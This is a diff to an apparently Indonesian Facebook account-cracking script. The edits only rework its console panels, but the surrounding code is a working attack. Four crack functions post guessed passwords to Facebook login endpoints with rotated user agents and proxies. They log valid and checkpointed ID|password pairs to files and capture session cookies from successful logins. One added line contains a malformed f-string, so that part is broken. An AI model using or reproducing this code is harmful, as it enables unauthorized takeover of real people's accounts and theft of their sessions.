@@ -743,7 +743,7 @@ def setting():
 		print(' ╰─  Pilih Yang Bener Kontooll ')
 		exit()
 	cetak(panel(f'[bold white]     Cobain Satu Sampai Empat metode nya ',width=50,style=f"bold cyan"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode M-Alpha [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode Mbasic [[bold green]Very Recommended[bold white]][/]',width=50,title=f"[bold green]Setting Metode",style=f"bold cyan"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode M-Alpha [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode Mbasic [[bold green]Very Recommended[bold white]][/]',width=50,title=f"[bold green]Setting Metode",style=f"bold cyan"))
 	hc = input(f' ╰─  Pilih Metode : ')
 	if hc in ['1','01']:
 		method.append('async')
@@ -781,7 +781,7 @@ def setting():
 def passwrd():
 	global prog,des
 	print('')
-	cetak(panel(f' [bold green]• [bold white]Akun [bold white][[bold green]OK[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold green]{(okc)} [bold white]\n [bold green]•[bold white] Akun [bold white][[bold yellow]CP[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold yellow]{(cpc)}\n',width=60,title=f"[bold green]Informasi",subtitle=f"[bold green]On/Off Kan Mode Pesawat Jika Tidak Ada Hasil",style=f"bold cyan"))
+	cetak(panel(f' [bold green]• [bold white]Akun [bold white][[bold green]OK[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold green]{(okc)} [bold white]\n [bold green]•[bold white] Akun [bold white][[bold yellow]CP[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold yellow]{(cpc)}',width=60,title=f"[bold green]Informasi",subtitle=f"[bold green]On/Off Kan Mode Pesawat Jika Tidak Ada Hasil",style=f"bold cyan"))
 	prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -833,7 +833,7 @@ def crack(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
+	prog.update(des,description=f"\n- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -844,7 +844,8 @@ def crack(idf,pwv):
 			ses.headers.update({"Host":'d.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold white]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -853,7 +854,9 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]XyzonDev OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -871,7 +874,7 @@ def crackasync(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
+	prog.update(des,description=f"\n- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -905,7 +908,8 @@ def crackasync(idf,pwv):
 			}
 			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold white]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -914,7 +918,9 @@ def crackasync(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold green]RifaiXD OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"{color_table"))
+				cetak(panel(f"[bold green]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -931,7 +937,7 @@ def crackreguler(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
+	prog.update(des,description=f"\n- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -965,7 +971,8 @@ def crackreguler(idf,pwv):
 			}
 			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold white]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -974,7 +981,9 @@ def crackreguler(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold green]XyzonDev OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -991,7 +1000,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
+	prog.update(des,description=f"\n- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1006,7 +1015,8 @@ def crackmbasic(idf,pwv):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold white]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1015,7 +1025,9 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold green]XyzonDev OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
